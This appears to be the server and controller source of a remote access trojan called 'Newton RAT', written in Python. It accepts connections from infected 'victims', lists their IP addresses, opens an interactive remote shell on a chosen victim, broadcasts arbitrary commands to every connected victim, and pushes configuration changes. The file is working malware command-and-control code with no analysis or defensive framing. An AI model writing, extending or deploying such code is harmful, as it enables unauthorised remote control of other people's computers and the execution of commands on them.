import socket
from threading import Thread
import sys
import time
from local_libs.config import parse_config
from local_libs.env_vars import *


def get_ip(self):
    return self.getpeername()[0]

socket.socket.get_ip = get_ip


class Connections:
    def __init__(self):
        self.victims_sockets = []
        self.connections_log = {
            "connected": [],
            "disconnected": []
        }
        self.current_victim = None

    def get_victims(self):
        return self.victims_sockets

    def append_victim(self, v_socket):
        self.victims_sockets.append(v_socket)

    def remove_victim(self, v_socket):
        self.victims_sockets.remove(v_socket)

    def append_log(self, address):
        self.connections_log["connected"].append(address)

    def remove_log(self, address):
        self.connections_log["disconnected"].append(address)

    def __remove_temp_log(self, action, address):
        self.connections_log[action].remove(address)

    def show_log(self):
        for address in self.connections_log["connected"]:
            print(f"[+] {address} connected")
            self.__remove_temp_log("connected", address)
        for address in self.connections_log["disconnected"]:
            print(f"[+] {address} disconnected")
            self.__remove_temp_log("disconnected", address)

connections = Connections()


class Cli:
    def __init__(self):
        self.cli_commands = [
            ("Show server commands", self.__show_server_commands),
            ("List of victims", self.__print_list_of_victims),
            ("Connect to victim", self.__connect_to_victim),
            ("Send command to all victims", self.__send_all),
            ("Exit", self.__exit)
        ]

    def start(self):
        self.greetings()
        self.handle()

    def greetings(self):
        print("\nWelcome to server control of Newton RAT!\n")
        self.__show_server_commands()

    def handle(self):
        while True:
            connections.show_log()
            try:
                command_number = int(input("Enter commands number >>> "))
                command_method = self.cli_commands[command_number][1]
                command_method()
            except Exception:
                print("Wrong command!")

    def __show_server_commands(self):
        print("You can use commands below:")

        for n, c in zip(range(len(self.cli_commands)), [c[0] for c in self.cli_commands]):
            print(f"({n}) {c}")
        print("")

    def __print_list_of_victims(self):
        victims_sockets = connections.get_victims()
        if len(victims_sockets) != 0:
            for v_socket in victims_sockets:
                print("Victims ip addresses list:")
                print(v_socket.get_ip())
        else:
            print("There are no victims")

    def __connect_to_victim(self):
        victim_ip = input("Enter victims ip >>> ")
        v_socket = Server.get_socket_by_ip(victim_ip)
        if v_socket:
            connections.current_victim = victim_ip
            victim = Victim(victim_ip, v_socket)
            victim.connect()
        else:
            print(f"IP {victim_ip} not founded")
        connections.current_victim = None

    def __send_all(self):
        victims_sockets = connections.get_victims()
        command = input("Enter command >> ")
        for v_socket in victims_sockets:
            victim_ip = v_socket.get_ip()
            print(f"\nIP {victim_ip} ↓")
            Victim.handle_command(v_socket, command)
            print(f"\n{victim_ip} accepted command")
        print("")

    def __exit(self):
        victims_sockets = connections.get_victims()
        for v_socket in victims_sockets:
            v_socket.close()
        sys.exit(0)


class Victim:
    def __init__(self, ip, v_socket):
        self.ip = ip
        self.v_socket = v_socket
    
    def __start_shell(self):
        self.v_socket.send("start shell".encode("utf-8"))
        print(self.v_socket.recv(1024 * 4).decode("utf-8"), end="")
    
    def connect(self):
        print(f"Successful connected to {self.ip}")
        self.__start_shell()
        while True:
            command = input()
            if command == "exit":
                print("Exiting...")
                break
            else:
                try:
                    Victim.handle_command(self.v_socket, command)
                except Exception as error:
                    print(f"Error: {error}")
    
    @staticmethod
    def handle_command(v_socket, command):
        command = Victim.handle_service_command(command)
        v_socket.send(command.encode("utf-8"))
        print(v_socket.recv(1024 * 1024).decode("utf-8"), end="")
    
    @staticmethod
    def handle_service_command(command, v_socket=None):
        if command.find("change config") == 0:
            command = command.split(" ")
            new_config = parse_config(command[-1])
            command[-1] = new_config
            command = " ".join(command)
            return command
        else:
            return command


class Server:
    def __init__(self, SERVER_IP, SERVER_PORT):
        self.SERVER_IP = SERVER_IP
        self.SERVER_PORT = SERVER_PORT
        self.s = None

    def run(self):
        self.s = socket.socket()
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind((self.SERVER_IP, self.SERVER_PORT))
        self.s.listen()

        print(f"[*] Listening as {self.SERVER_IP}:{self.SERVER_PORT}")

        t1 = Thread(target=self.accepting_victims, args=())
        t1.daemon = True
        t1.start()

        t2 = Thread(target=self.check_available_victims, args=())
        t2.daemon = True
        t2.start()

    def accepting_victims(self):
        while True:
            v_socket, v_address = self.s.accept()
            connections.append_victim(v_socket)
            connections.append_log(v_address[0])

    def check_available_victims(self):
        victims_sockets = connections.get_victims()
        while True:
            for v_socket in victims_sockets:
                if v_socket.get_ip() == connections.current_victim:  # doesn't work
                    continue
                else:
                    try:
                        v_socket.send("hello".encode())
                    except:
                        connections.remove_log(v_socket.get_ip())
                        connections.remove_victim(v_socket)
                        v_socket.close()
                time.sleep(1)

    @staticmethod
    def get_socket_by_ip(ip):
        victims_sockets = connections.get_victims()
        for v_socket in victims_sockets:
            if v_socket.get_ip() == ip:
                return v_socket
        return None


if __name__ == "__main__":
    Server("0.0.0.0", DEFAULT_SERVER_PORT).run()
    Cli().start()
